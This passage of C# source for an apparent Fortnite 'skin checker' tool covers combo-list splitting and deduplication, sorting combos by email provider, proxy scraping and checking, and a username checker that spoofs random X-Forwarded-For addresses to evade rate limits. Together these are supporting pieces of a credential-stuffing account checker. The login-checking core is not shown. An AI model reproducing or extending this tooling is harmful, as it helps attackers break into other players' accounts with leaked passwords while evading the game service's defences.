                    string[] words2 = phrase2.Split(',');
                    try
                    {
                        GlobalVariables.Backblings.Add(words2[0].ToLower(), words2[1]);
                    }
                    catch { }
                }
            }
        }

        private void LoadDances()
        {
            string phraseEncrypted = new WebClient().DownloadString("https://pastebin.com/raw/T4vD2Yhm");
            string phrase = DecryptString(phraseEncrypted);
            Console.WriteLine(phrase);
            using (var reader = new StringReader(phrase))
            {
                for (string line = reader.ReadLine(); line != null; line = reader.ReadLine())
                {
                    string phrase2 = line;
                    string[] words2 = phrase2.Split(',');
                    try
                    {
                        GlobalVariables.Dances.Add(words2[0].ToLower(), words2[1]);
                    }
                    catch { }
                }
            }
        }

        private void LoadEmojis()
        {
            string phraseEncrypted = new WebClient().DownloadString("https://pastebin.com/raw/A2qK5MN0");
            string phrase = DecryptString(phraseEncrypted);
            Console.WriteLine(phrase);
            using (var reader = new StringReader(phrase))
            {
                for (string line = reader.ReadLine(); line != null; line = reader.ReadLine())
                {
                    string phrase2 = line;
                    string[] words2 = phrase2.Split(',');
                    try
                    {
                        GlobalVariables.Emojis.Add(words2[0].ToLower(), words2[1]);
                    }
                    catch { }
                }
            }
        }

        private void LoadGliders()
        {
            string phraseEncrypted = new WebClient().DownloadString("https://pastebin.com/raw/4KQuLjvG");
            string phrase = DecryptString(phraseEncrypted);
            Console.WriteLine(phrase);
            using (var reader = new StringReader(phrase))
            {
                for (string line = reader.ReadLine(); line != null; line = reader.ReadLine())
                {
                    string phrase2 = line;
                    string[] words2 = phrase2.Split(',');
                    try
                    {
                        GlobalVariables.Gliders.Add(words2[0].ToLower(), words2[1]);
                    }
                    catch { }
                }
            }
        }

        private void LoadPickAxes()
        {
            string phraseEncrypted = new WebClient().DownloadString("https://pastebin.com/raw/T1E7pXj0");
            string phrase = DecryptString(phraseEncrypted);
            Console.WriteLine(phrase);
            using (var reader = new StringReader(phrase))
            {
                for (string line = reader.ReadLine(); line != null; line = reader.ReadLine())
                {
                    string phrase2 = line;
                    string[] words2 = phrase2.Split(',');
                    try
                    {
                        GlobalVariables.Pickaxes.Add(words2[0].ToLower(), words2[1]);
                    }
                    catch { }
                }
            }
        }

        private void SingleAccountCheckBtn_Click(object sender, EventArgs e)
        {
            Thread StartSingleCheck = new Thread(SingleAccountCheck);
            CheckForIllegalCrossThreadCalls = false;
            StartSingleCheck.Start();
            MainTabControl.SelectedTab = MainTabControl.TabPages["SkinCheckerPage"];
        }

        private void SellingPictureBox_Click(object sender, EventArgs e)
        {
            try
            {
                Process.Start("https://forkknife.atshop.io/");
            }
            catch
            {
                MessageBox.Show("RIP, The lama was to damn ugly to load, Give it another go!");
            }
        }

        private void pictureBox6_Click(object sender, EventArgs e)
        {
            Process.Start("https://tcmtools.com");
        }

        private void NameChecker()
        {
            NameCheck.Enabled = false;
            NameResults.Enabled = true;
            NameResults.Text = "";
            foreach (string line in NameCheck.Lines)
            {
                Task task = Task.Run(() =>
                {
                    try
                    {
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            var RandomAssIpAddress = new byte[4];
                            FuckingProxyless.NextBytes(RandomAssIpAddress);
                            httpRequest.AddHeader("X-Forwarded-For", new IPAddress(RandomAssIpAddress).ToString());
                            string IsAvalible = httpRequest.Get("https://fortnitetracker.com/profile/search?q=" + line).ToString();
                            if (!IsAvalible.Contains("404 Not Found"))
                            {
                                NameResults.AppendText(line + " Is Already Taken \r\n");
                            }
                            else
                            {
                                NameResults.AppendText(line + " Is NOT Taken \r\n");
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        NameResults.AppendText(line + " Is NOT Taken \r\n");
                    }
                });
                task.Wait();
            }
            NameCheck.Enabled = true;
            NameResults.Enabled = true;
        }

        private void nsButton16_Click_1(object sender, EventArgs e)
        {
            try
            {
                Thread StartCheckNames = new Thread(NameChecker);
                CheckForIllegalCrossThreadCalls = false;
                StartCheckNames.Start();
            }
            catch
            {
                MessageBox.Show("Oops Something Didn't Go Right, Give It Another Go!");
            }
        }

        private void StartCrawlingUrls()
        {
            Crawler.startCrawler(new Uri(UrlToScrapeFrom.Text), 100);
        }

        private void nsButton17_Click(object sender, EventArgs e)
        {
            if (!File.Exists("Dannyyy.WebCrawling.dll") || (!File.Exists("AngleSharp.dll")))
            {
                DialogResult dialogResult = MessageBox.Show("Would You Like To Download The Required Files To Use This Functional?", "File Download Required!", MessageBoxButtons.YesNo);
                if (dialogResult == DialogResult.Yes)
                {
                    DownloadUrlScraperFiles form = new DownloadUrlScraperFiles();
                    form.Show(); // or form.ShowDialog(this);
                }
                else if (dialogResult == DialogResult.No)
                {
                    //
                }
            }
            else
            {
                ScrapedURLs.Text = null;
                Thread URLCrawling = new Thread(StartCrawlingUrls);
                CheckForIllegalCrossThreadCalls = false;
                URLCrawling.Start();
            }
        }

        private void nsButton18_Click(object sender, EventArgs e)
        {
            MainTabControl.SelectedTab = MainTabControl.TabPages["EvenMoreSettings"];
            ProxyListToScrapeMultiple.Text = ScrapedURLs.Text;
        }

        private void nsButton19_Click(object sender, EventArgs e)
        {
            Crawler.stopCrawler();
            for (int i = 0; i < Crawler.grabArray().Count; i++)
            {
                URLScraperListbox.Items.Add(Crawler.grabArray()[i]);
            }
            string URLScraperTextbox = "";
            foreach (var item in URLScraperListbox.Items)
            {
                URLScraperTextbox += item.ToString() + "\r\n"; // /n to print each item on new line or you omit /n to print text on same line
            }
            ScrapedURLs.Text = URLScraperTextbox;
        }

        private void nsButton20_Click(object sender, EventArgs e)
        {
            URLScraperListbox.Items.Clear();
            Crawler.clearArray();
            ScrapedURLs.Text = null;
        }

        public static string path3;
        private List<string> ProxiesTrimmed = new List<string>();
        private void nsButton21_Click(object sender, EventArgs e)
        {
            {
                if (FinishedProxies == null)
                {
                    MessageBox.Show("ERROR: Please try and get some proxies before saving nothing, Crack head :D");
                    return;
                }
                try
                {
                    saveFileDialog3.FileName = Proxies.Count() + " Proxies Scraped By TCM Fortnite Tool";
                    saveFileDialog3.Filter = "Text File | *.txt";
                    if (saveFileDialog3.ShowDialog() == DialogResult.OK)
                    {
                        path3 = saveFileDialog3.FileName;
                    }
                }
                catch
                {
                    MessageBox.Show("OOPS: Some bad shit wen't down, Give it another try!");
                }

                try

                {
                    ProxiesTrimmed = Proxies.Select(t => t.Trim()).ToList();
                    System.IO.File.WriteAllLines(path3, ProxiesTrimmed);

                }
                catch
                {
                    MessageBox.Show("ERROR: You must choose a path to save to.");
                }
            }
        }

        private void StartThreadingProxyChecker()
        {
            if (!Directory.Exists(string.Format("{0}\\Results", Application.StartupPath)))
            {
                Directory.CreateDirectory(string.Format("{0}\\Results", Application.StartupPath));
            }
            GoodProxiesSave = Path.Combine(folder, string.Format("Good Proxies By TCM's Skin Checker.txt", fileName));
            BadProxiesChecked = Path.Combine(folder, string.Format("Bad Proxies By TCM's Skin Checker.txt", fileName));

            if (BtnStartProxies.InvokeRequired)
            {
                BtnStartProxies.Invoke((MethodInvoker)(() => { BtnStartProxies.Enabled = false; }));
            }
            _Run = false;
            if (!IfPaauseTheList.Checked)
            {
                BadProxies = 0;
                GoodProxies = 0;
                DeadProxies = 0;
            }
            _Run = true;
            StartWorkProxyCheck();
        }


        private void DedicatedRareSkin_CheckedChanged(object sender)
        {
            if (DedicatedRareSkin.Checked)
            {
                MessageBox.Show("Feature still being worked on...");
                DedicatedRareSkin.Checked = false;
                //MainTabControl.TabPages.Add(RareSkinsDedication);
            }
            else
            {
                //MainTabControl.TabPages.Remove(RareSkinsDedication);
            }
        }

        private void ColorChooseDropDown_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (ColorChooseDropDown.Text == "Outline Color")
            {
                pictureBox31.ImageLocation = "http://tcmtools.com/CheckerStuff/Images/edit1.png";
                nsTextBox9.Text = "Currently Editing The Color Above And Below The Text (The Blue Color Shown In The Image)";
            }
            else if (ColorChooseDropDown.Text == "Back Color")
            {
                pictureBox31.ImageLocation = "http://tcmtools.com/CheckerStuff/Images/edit1.png";
                nsTextBox9.Text = "Currently Editing The Color Behind The Text (The Grey Color That Is Behind The Text)";
            }
            else if (ColorChooseDropDown.Text == "Two Lines Before Text (Currently Selected)")
            {
                pictureBox31.ImageLocation = "http://tcmtools.com/CheckerStuff/Images/edit1.png";
                nsTextBox9.Text = "Currently Editing The Two Lines Before Text (The Red Color Selected In The Image)";
            }
            else if (ColorChooseDropDown.Text == "Two Lines Before Text (NOT Selected)")
            {
                pictureBox31.ImageLocation = "http://tcmtools.com/CheckerStuff/Images/edit1.png";
                nsTextBox9.Text = "Currently Editing The Color Of The Two Lines Before The Text When NOT Selected ";
            }
            else if (ColorChooseDropDown.Text == "Outline Of The Whole Tool")
            {
                pictureBox31.ImageLocation = "http://tcmtools.com/CheckerStuff/Images/edit1.png";
                nsTextBox9.Text = "Currently Editing The Entire Outline Of The Tool.";
            }
            else if (ColorChooseDropDown.Text == "Label's Text Color")
            {
                pictureBox31.ImageLocation = "http://tcmtools.com/CheckerStuff/Images/edit2.png";
                nsTextBox9.Text = "Currendly Editing The Yellow Text For Labels As Shown In The Image";
            }
            else if (ColorChooseDropDown.Text == "GroupBox Label Text")
            {
                pictureBox31.ImageLocation = "http://tcmtools.com/CheckerStuff/Images/edit3.png";
                nsTextBox9.Text = "Currendly Editing The Yellow Text For Labels As Shown In The Image";
            }
        }

        private void nsButton150_Click(object sender, EventArgs e)
        {
            DialogResult YesNo = MessageBox.Show("Would You Like To Restart The Application So Color Change Will Then Take Effect (Must Click Yes If You Want To See The Change)?", "Application Restart For Change!", MessageBoxButtons.YesNo);
            if (YesNo == DialogResult.Yes)
            {
                string path = Directory.GetCurrentDirectory();
                System.Diagnostics.Process.Start(path + "//TCM Fortnite Tool.exe"); // to start new instance of application
                Process.GetCurrentProcess().Kill();
            }
            if (YesNo == DialogResult.No)
            {
                MessageBox.Show("You Have Chose NOT To Close The Application And For Changes To Take Effect, Next Time You Open The Program It Will Take Effect.");
            }
        }

        private void nsButton149_Click(object sender, EventArgs e)
        {
            Settings.Default["Color1"] = "";
            Settings.Default["Color2"] = "";
            Settings.Default["Color3"] = "";
            Settings.Default["Color4"] = "";
            Settings.Default["Color5"] = "";
            Settings.Default["Color6"] = "";
            Settings.Default["Color7"] = "";
            Settings.Default["Color8"] = "";
            Settings.Default["Color9"] = "";
            Settings.Default["Color10"] = "";
            Settings.Default["Color11"] = "";
            Settings.Default["Color12"] = "";
            Settings.Default["Color13"] = "";
            Settings.Default["Color14"] = "";
            Settings.Default["Color15"] = "";
            Settings.Default["Color16"] = "";
            Settings.Default["Color17"] = "";
            Settings.Default["Color18"] = "";
            Settings.Default.Save();
            DialogResult YesNo2 = MessageBox.Show("In Order For Changes To Take Effect Application Restart Is Required, Would You Like To Restart The Application?", "Restart Required!", MessageBoxButtons.YesNo);
            if (YesNo2 == DialogResult.Yes)
            {
                string path = Directory.GetCurrentDirectory();
                System.Diagnostics.Process.Start(path + "//TCM Fortnite Tool.exe"); // to start new instance of application
                Process.GetCurrentProcess().Kill();
            }
            if (YesNo2 == DialogResult.No)
            {
                MessageBox.Show("You Have Chose NOT To Close The Application And For Changes To Take Effect, Next Time You Open The Program It Will Take Effect.");
            }
        }

        private void nsButton22_Click(object sender, EventArgs e)
        {
            int r;
            int g;
            int b;
            int a;
            Random random;

            random = new Random();
            r = random.Next(0, 254);
            g = random.Next(0, 254);
            b = random.Next(0, 254);
            a = random.Next(0, 254);

            colorGrid.Color = Color.FromArgb(a, r, g, b);
        }

        private void colorGrid_ColorChanged(object sender, EventArgs e)
        {
            if (ColorChooseDropDown.Text == "Outline Color")
            {
                Settings.Default["Color1"] = colorGrid.Color.R.ToString();
                Settings.Default["Color2"] = colorGrid.Color.G.ToString();
                Settings.Default["Color3"] = colorGrid.Color.B.ToString();
                Settings.Default.Save();
            }
            if (ColorChooseDropDown.Text == "Back Color")
            {
                Settings.Default["Color4"] = colorGrid.Color.R.ToString();
                Settings.Default["Color5"] = colorGrid.Color.G.ToString();
                Settings.Default["Color6"] = colorGrid.Color.B.ToString();
                Settings.Default.Save();
            }
            if (ColorChooseDropDown.Text == "Two Lines Before Text (Currently Selected)")
            {
                Settings.Default["Color7"] = colorGrid.Color.R.ToString();
                Settings.Default["Color8"] = colorGrid.Color.G.ToString();
                Settings.Default["Color9"] = colorGrid.Color.B.ToString();
                Settings.Default.Save();
            }
            if (ColorChooseDropDown.Text == "Two Lines Before Text (NOT Selected)")
            {
                Settings.Default["Color10"] = colorGrid.Color.R.ToString();
                Settings.Default["Color11"] = colorGrid.Color.G.ToString();
                Settings.Default["Color12"] = colorGrid.Color.B.ToString();
                Settings.Default.Save();
            }
            if (ColorChooseDropDown.Text == "Outline Of The Whole Tool")
            {
                Settings.Default["Color13"] = colorGrid.Color.R.ToString();
                Settings.Default["Color14"] = colorGrid.Color.G.ToString();
                Settings.Default["Color15"] = colorGrid.Color.B.ToString();
                Settings.Default.Save();
            }
            if (ColorChooseDropDown.Text == "Label's Text Color")
            {
                Settings.Default["Color16"] = colorGrid.Color.R.ToString();
                Settings.Default["Color17"] = colorGrid.Color.G.ToString();
                Settings.Default["Color18"] = colorGrid.Color.B.ToString();
                Settings.Default.Save();
            }
            if (ColorChooseDropDown.Text == "GroupBox Label Text")
            {
                Settings.Default["Color19"] = colorGrid.Color.R.ToString();
                Settings.Default["Color20"] = colorGrid.Color.G.ToString();
                Settings.Default["Color21"] = colorGrid.Color.B.ToString();
                Settings.Default.Save();
            }
            panel1.BackColor = colorGrid.Color;
        }


        public bool ShownUpdateMessage = false;

        private void SaveBadProxies_CheckedChanged(object sender)
        {

        }


        private void PalletPathCreator()
        {
            string pathhm = PalettePath;
            if (!Directory.Exists(pathhm))
            {
                Directory.CreateDirectory(pathhm);
            }
        }

        private string PalettePath
        {
            get { return Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "palettes"); }
        }
        private void palettesListBox_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (palettesListBox.SelectedIndex != -1)
            {
                colorGrid.Colors = ColorCollection.LoadPalette(Path.Combine(PalettePath, palettesListBox.SelectedItem.ToString()));
            }
        }

        protected override void OnLoad(EventArgs e)
        {
            PalletPathCreator();
            base.OnLoad(e);

            colorGrid.Color = Color.LightSkyBlue;

            palettesListBox.BeginUpdate();

            foreach (string fileName in Directory.GetFiles(PalettePath))
            {
                // ReSharper disable once AssignNullToNotNullAttribute
                palettesListBox.Items.Add(Path.GetFileName(fileName));
            }

            palettesListBox.EndUpdate();
        }

        private void SaveCustomColors_Click(object sender, EventArgs e)
        {
            if (MessageBox.Show("Are You Sure You Want To Download The Color Files?", "Download Files?", MessageBoxButtons.YesNo, MessageBoxIcon.Question) != DialogResult.Yes)
                return;
            webClient.DownloadFile("http://tcmtools.com/CheckerStuff/PalletFiles/16pal_v20.act", PalettePath + "//16pal_v20.act");
            webClient.DownloadFile("http://tcmtools.com/CheckerStuff/PalletFiles/arne-v20-16.aco", PalettePath + "//arne-v20-16.aco");
            webClient.DownloadFile("http://tcmtools.com/CheckerStuff/PalletFiles/arnev-20-16.pal", PalettePath + "//arnev-20-16.pal");
            webClient.DownloadFile("http://tcmtools.com/CheckerStuff/PalletFiles/atari-800xl-palette.pal", PalettePath + "//atari-800xl-palette.pal");
            webClient.DownloadFile("http://tcmtools.com/CheckerStuff/PalletFiles/background.lbm", PalettePath + "//background.lbm");
            webClient.DownloadFile("http://tcmtools.com/CheckerStuff/PalletFiles/background.pal", PalettePath + "//background.pal");
            webClient.DownloadFile("http://tcmtools.com/CheckerStuff/PalletFiles/db16.gpl", PalettePath + "//db16.gpl");
            webClient.DownloadFile("http://tcmtools.com/CheckerStuff/PalletFiles/db32.gpl", PalettePath + "//db32.gpl");
            webClient.DownloadFile("http://tcmtools.com/CheckerStuff/PalletFiles/grayscale.pal", PalettePath + "//grayscale.pal");
            webClient.DownloadFile("http://tcmtools.com/CheckerStuff/PalletFiles/Hex256.pal", PalettePath + "//Hex256.pal");
            webClient.DownloadFile("http://tcmtools.com/CheckerStuff/PalletFiles/PaintNet.txt", PalettePath + "//PaintNet.txt");
            colorGrid.Color = Color.LightSkyBlue;

            palettesListBox.BeginUpdate();

            foreach (string fileName in Directory.GetFiles(PalettePath))
            {
                // ReSharper disable once AssignNullToNotNullAttribute
                palettesListBox.Items.Add(Path.GetFileName(fileName));
            }

            palettesListBox.EndUpdate();
        }

        private void LogoutButton_Click(object sender, EventArgs e)
        {
            LogoutButton.Visible = false;
            nsButton3.Visible = true;
            nsButton5.Visible = true;
            nsButton7.Visible = true;
            enterprogram = false;
            nsButton3.Enabled = true;
            ForumUser.Enabled = true;
        }

        private void ValidProxyListBox_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void nsCheckBox1_CheckedChanged(object sender)
        {

        }

        private void DupesFinder()
        {
            DupesRemoverOriginalLB.Items.Clear();
            FoundDuplicatesTextFile.Items.Clear();
            DupesListBoxRemover.Items.Clear();
            DupesRemoverTotalOriginalProxies.Text = DupesRemoverOriginalLB.Items.Count.ToString();
            FoundDuplicateFiles.Text = FoundDuplicatesTextFile.Items.Count.ToString();
            TotalProxiesDupesRemoved.Text = DupesListBoxRemover.Items.Count.ToString();

            using (StreamReader OriginalFileAdded = new StreamReader(DupesPath))
            {
                string OriginalDupesLine;
                while ((OriginalDupesLine = OriginalFileAdded.ReadLine()) != null)
                {
                    if (!DupesListBoxRemover.Items.Contains(OriginalDupesLine))
                    {
                        DupesListBoxRemover.Items.Add(OriginalDupesLine);
                        TotalProxiesDupesRemoved.Text = DupesListBoxRemover.Items.Count.ToString();
                        DupesRemoverOriginalLB.Items.Add(OriginalDupesLine);
                        DupesRemoverTotalOriginalProxies.Text = DupesRemoverOriginalLB.Items.Count.ToString();
                    }
                    else
                    {
                        FoundDuplicatesTextFile.Items.Add(OriginalDupesLine);
                        FoundDuplicateFiles.Text = FoundDuplicatesTextFile.Items.Count.ToString();
                        DupesRemoverOriginalLB.Items.Add(OriginalDupesLine);
                        DupesRemoverTotalOriginalProxies.Text = DupesRemoverOriginalLB.Items.Count.ToString();

                    }
                }
            }
            DupesRemoverTotalOriginalProxies.Text = DupesRemoverOriginalLB.Items.Count.ToString();
            FoundDuplicateFiles.Text = FoundDuplicatesTextFile.Items.Count.ToString();
            TotalProxiesDupesRemoved.Text = DupesListBoxRemover.Items.Count.ToString();
        }

        public static string DupesPath;
        private void LoadCombosProxyButton_Click(object sender, EventArgs e)
        {
            DupesRemoverOriginalLB.Items.Clear();
            FoundDuplicatesTextFile.Items.Clear();
            DupesListBoxRemover.Items.Clear();
            DupesPath = null;
            OpenFileDialog DupesFile = new OpenFileDialog();
            DupesFile.Filter = "Text File | *.txt";
            if (DupesFile.ShowDialog() == DialogResult.OK)
            {
                DupesPath = DupesFile.FileName.ToString();
                Thread DupesComboKiller = new Thread(DupesFinder);
                CheckForIllegalCrossThreadCalls = false;
                DupesComboKiller.Start();
            }
            else
            {
                MessageBox.Show("Path not chosen or something else wen't wrong, Try again!");
                return;
            }
        }

        private void LoadComboList()
        {
            ComboSplitterCombos.Clear();
            OpenFileDialog openFileDialog2 = new OpenFileDialog();
            openFileDialog2.RestoreDirectory = true;
            openFileDialog2.Multiselect = false;
            openFileDialog2.Filter = "Text Files (*.txt)|*.txt";
            openFileDialog2.FilterIndex = 1;
            int num = (int)openFileDialog2.ShowDialog();
            try
            {
                MyComboFile = openFileDialog2.FileName;
                using (StreamReader streamReader = new StreamReader(MyComboFile))
                {
                    while (streamReader.Peek() != -1)
                        ComboSplitterCombos.Add(streamReader.ReadLine());
                }
                fileName = Path.GetFileNameWithoutExtension(openFileDialog2.FileName);
                ComboCount.Text = "Total Combos: " + ComboSplitterCombos.Count();
            }
            catch
            {
                return;
            }
        }

        private void ComboSplitter_LoadList_Click(object sender, EventArgs e)
        {
            LoadComboList();
        }

        private void StartComboSplitting()
        {
            if (!Directory.Exists(folder + "\\Splitter"))
            {
                Directory.CreateDirectory(folder + "\\Splitter");
            }
            ComboSplitter_Start.Enabled = false;
            ComboSplitter_LoadList.Enabled = false;
            var ComboCounterReader = File.OpenText(MyComboFile);
            string outFileName = ComboSplitterNameOutput.Text + " {0}.txt";
            int outFileNumber = 1;
            int MaxLineInt = (int)ComboSplitterNumber.Value;
            int MAX_LINES = MaxLineInt;
            int totaldone = 0;
            ComboSplitterProgressBar.MaxValue = ComboSplitterCombos.Count();
            while (!ComboCounterReader.EndOfStream)
            {
                string ListboxName = outFileName.Replace(".txt", null);
                ComboSplitterListBox.Items.Add(string.Format(ListboxName, outFileNumber + " Finished!"));
                var writer = File.CreateText(string.Format(folder + "\\Splitter\\" + outFileName, outFileNumber++));
                for (int idx = 0; idx < MAX_LINES; idx++)
                {
                    string currentlinetowrite = ComboCounterReader.ReadLine();
                    writer.WriteLine(currentlinetowrite);
                    ComboSlitterProgress.Items.Add("Adding " + currentlinetowrite);
                    ComboSplitterProgressBar.Value = totaldone;
                    totaldone++;
                    ComboSplitterListBox.SelectedIndex = ComboSplitterListBox.Items.Count - 1;
                    ComboSlitterProgress.SelectedIndex = ComboSlitterProgress.Items.Count - 1;
                    ComboSplitter_CurrentlyChecking.Text = string.Format("Checked " + totaldone + "/" + ComboSplitterCombos.Count);
                    if (ComboCounterReader.EndOfStream) break;
                }
                writer.Close();
            }
            ComboCounterReader.Close();
            ComboSplitterListBox.Items.Add("FINISHED!");
            ComboSplitterProgressBar.Value = ComboSplitterCombos.Count();
            ComboSplitterListBox.SelectedIndex = ComboSplitterListBox.Items.Count - 1;
            ComboSlitterProgress.SelectedIndex = ComboSlitterProgress.Items.Count - 1;
            ComboSplitter_Start.Enabled = true;
            ComboSplitter_LoadList.Enabled = true;
        }



        private void ComboSplitter_Start_Click(object sender, EventArgs e)
        {
            ComboSplitterListBox.Items.Clear();
            ComboSlitterProgress.Items.Clear();
            Thread ButtonLoader = new Thread(StartComboSplitting);
            CheckForIllegalCrossThreadCalls = false;
            ButtonLoader.Start();
        }

        public static string ProviderSplitter;
        private void nsButton23_Click(object sender, EventArgs e)
        {
            if (ComboSorterTextBox1.Text == "" && ComboSorterTextBox2.Text == "" && ComboSorterTextBox3.Text == "" && ComboSorterTextBox4.Text == "" && ComboSorterTextBox5.Text == "" && ComboSorterTextBox6.Text == "" && ComboSorterTextBox7.Text == "" && ComboSorterTextBox8.Text == "")
            {
                MessageBox.Show("WOAH SLICK\nYou Are Going To Need To Put Some Names In The TextBoxes To Check For First!\nExample Put email provider names such as\nhotmail\nhotmail.com\n@hotmail\nThen boot it up :)");
                return;
            }
            ProviderSplitter = null;
            ComboSorterListBox1.Items.Clear();
            ComboSorterListBox2.Items.Clear();
            ComboSorterListBox3.Items.Clear();
            ComboSorterListBox4.Items.Clear();
            ComboSorterListBox5.Items.Clear();
            ComboSorterListBox6.Items.Clear();
            ComboSorterListBox7.Items.Clear();
            ComboSorterListBox8.Items.Clear();
            OpenFileDialog ProviderSplitterFile = new OpenFileDialog();
            ProviderSplitterFile.Filter = "Text File | *.txt";
            if (ProviderSplitterFile.ShowDialog() == DialogResult.OK)
            {
                ProviderSplitter = ProviderSplitterFile.FileName.ToString();
                Thread ProviderSplitsStart = new Thread(ToolSplitter);
                CheckForIllegalCrossThreadCalls = false;
                ProviderSplitsStart.Start();
            }
            else
            {
                MessageBox.Show("Path not chosen or something else wen't wrong, Try again!");
                return;
            }
        }

        private void ToolSplitter()
        {
            ComboSorterListBox1.Items.Clear();
            ComboSorterListBox2.Items.Clear();
            ComboSorterListBox3.Items.Clear();
            ComboSorterListBox4.Items.Clear();
            ComboSorterListBox5.Items.Clear();
            ComboSorterListBox6.Items.Clear();
            ComboSorterListBox7.Items.Clear();
            ComboSorterListBox8.Items.Clear();
            using (StreamReader OriginalFileAdded = new StreamReader(ProviderSplitter))
            {
                string OriginalDupesLine;
                while ((OriginalDupesLine = OriginalFileAdded.ReadLine()) != null)
                {
                    if (OriginalDupesLine.Contains(ComboSorterTextBox1.Text) && ComboSorterTextBox1.Text != "")
                    {
                        ComboSorterListBox1.Items.Add(OriginalDupesLine);
                        SortListerCount1.Text = ComboSorterListBox1.Items.Count.ToString();
                        ComboSorterListBox1.SelectedIndex = ComboSorterListBox1.Items.Count - 1;
                    }
                    else if (OriginalDupesLine.Contains(ComboSorterTextBox2.Text) && ComboSorterTextBox2.Text != "")
                    {
                        ComboSorterListBox2.Items.Add(OriginalDupesLine);
                        SortListerCount2.Text = ComboSorterListBox2.Items.Count.ToString();
                        ComboSorterListBox2.SelectedIndex = ComboSorterListBox2.Items.Count - 1;
                    }
                    else if (OriginalDupesLine.Contains(ComboSorterTextBox3.Text) && ComboSorterTextBox3.Text != "")
                    {
                        ComboSorterListBox3.Items.Add(OriginalDupesLine);
                        SortListerCount3.Text = ComboSorterListBox3.Items.Count.ToString();
                        ComboSorterListBox3.SelectedIndex = ComboSorterListBox3.Items.Count - 1;
                    }
                    else if (OriginalDupesLine.Contains(ComboSorterTextBox4.Text) && ComboSorterTextBox4.Text != "")
                    {
                        ComboSorterListBox4.Items.Add(OriginalDupesLine);
                        SortListerCount4.Text = ComboSorterListBox4.Items.Count.ToString();
                        ComboSorterListBox4.SelectedIndex = ComboSorterListBox4.Items.Count - 1;
                    }
                    else if (OriginalDupesLine.Contains(ComboSorterTextBox5.Text) && ComboSorterTextBox5.Text != "")
                    {
                        ComboSorterListBox5.Items.Add(OriginalDupesLine);
                        SortListerCount5.Text = ComboSorterListBox5.Items.Count.ToString();
                        ComboSorterListBox5.SelectedIndex = ComboSorterListBox5.Items.Count - 1;
                    }
                    else if (OriginalDupesLine.Contains(ComboSorterTextBox6.Text) && ComboSorterTextBox6.Text != "")
                    {
                        ComboSorterListBox6.Items.Add(OriginalDupesLine);
                        SortListerCount6.Text = ComboSorterListBox6.Items.Count.ToString();
                        ComboSorterListBox6.SelectedIndex = ComboSorterListBox6.Items.Count - 1;
                    }
                    else if (OriginalDupesLine.Contains(ComboSorterTextBox7.Text) && ComboSorterTextBox7.Text != "")
                    {
                        ComboSorterListBox7.Items.Add(OriginalDupesLine);
                        SortListerCount7.Text = ComboSorterListBox7.Items.Count.ToString();
                        ComboSorterListBox7.SelectedIndex = ComboSorterListBox7.Items.Count - 1;
                    }
                    else if (OriginalDupesLine.Contains(ComboSorterTextBox8.Text) && ComboSorterTextBox8.Text != "")
                    {
                        ComboSorterListBox8.Items.Add(OriginalDupesLine);
                        SortListerCount8.Text = ComboSorterListBox8.Items.Count.ToString();
                        ComboSorterListBox8.SelectedIndex = ComboSorterListBox8.Items.Count - 1;
                    }
                }
                MessageBox.Show("DONE!");
            }
        }

        private void nsButton26_Click(object sender, EventArgs e)
        {

        }

        private void nsButton24_Click(object sender, EventArgs e)
        {
            Properties.Settings.Default["ComboSorter1"] = ComboSorterTextBox1.Text;
            Properties.Settings.Default["ComboSorter2"] = ComboSorterTextBox2.Text;
            Properties.Settings.Default["ComboSorter3"] = ComboSorterTextBox3.Text;
            Properties.Settings.Default["ComboSorter4"] = ComboSorterTextBox4.Text;
            Properties.Settings.Default["ComboSorter5"] = ComboSorterTextBox5.Text;
            Properties.Settings.Default["ComboSorter6"] = ComboSorterTextBox6.Text;
            Properties.Settings.Default["ComboSorter7"] = ComboSorterTextBox7.Text;
            Properties.Settings.Default["ComboSorter8"] = ComboSorterTextBox8.Text;
            Settings.Default.Save();
        }

        private void nsButton25_Click(object sender, EventArgs e)
        {
            string StartingDirectory = "Provider Splitter\\";
            if (ComboSorterListBox1.Items.Count < 1 && ComboSorterListBox2.Items.Count < 1 && ComboSorterListBox3.Items.Count < 1 && ComboSorterListBox4.Items.Count < 1 && ComboSorterListBox5.Items.Count < 1 && ComboSorterListBox6.Items.Count < 1 && ComboSorterListBox7.Items.Count < 1 && ComboSorterListBox8.Items.Count < 1)
            {
                MessageBox.Show("ERROR: Please try and get some valid proxies before saving nothing, Crack head :D");
                return;
            }
            if (ComboSorterListBox1.Items.Count >= 1)
            {
                try
                {
                    if (!Directory.Exists("Provider Splitter"))
                    {
                        Directory.CreateDirectory("Provider Splitter");
                    }
                    string SaveComboTextboxName1 = ComboSorterTextBox1.Text;
                    System.IO.StreamWriter SaveComboSortedList1 = new System.IO.StreamWriter(StartingDirectory + SaveComboTextboxName1 + ".txt");
                    foreach (var item in ComboSorterListBox1.Items)
                    {
                        SaveComboSortedList1.WriteLine(item);
                    }
                    SaveComboSortedList1.Close();
                }
                catch
                {

                }
            }
            if (ComboSorterListBox2.Items.Count >= 1)
            {
                try
                {
                    if (!Directory.Exists("Provider Splitter"))
                    {
                        Directory.CreateDirectory("Provider Splitter");
                    }
                    string SaveComboTextboxName2 = ComboSorterTextBox2.Text;
                    System.IO.StreamWriter SaveComboSortedList2 = new System.IO.StreamWriter(StartingDirectory + SaveComboTextboxName2 + ".txt");
                    foreach (var item in ComboSorterListBox2.Items)
                    {
                        SaveComboSortedList2.WriteLine(item);
                    }
                    SaveComboSortedList2.Close();
                }
                catch
                {

                }
            }
            if (ComboSorterListBox3.Items.Count >= 1)
            {
                try
                {
                    if (!Directory.Exists("Provider Splitter"))
                    {
                        Directory.CreateDirectory("Provider Splitter");
                    }
                    string SaveComboTextboxName3 = ComboSorterTextBox3.Text;
                    System.IO.StreamWriter SaveComboSortedList3 = new System.IO.StreamWriter(StartingDirectory + SaveComboTextboxName3 + ".txt");
                    foreach (var item in ComboSorterListBox3.Items)
                    {
                        SaveComboSortedList3.WriteLine(item);
                    }
                    SaveComboSortedList3.Close();
                }
                catch
                {

                }
            }
            if (ComboSorterListBox4.Items.Count >= 1)
            {
                try
                {
                    if (!Directory.Exists("Provider Splitter"))
                    {
                        Directory.CreateDirectory("Provider Splitter");
                    }
                    string SaveComboTextboxName4 = ComboSorterTextBox4.Text;
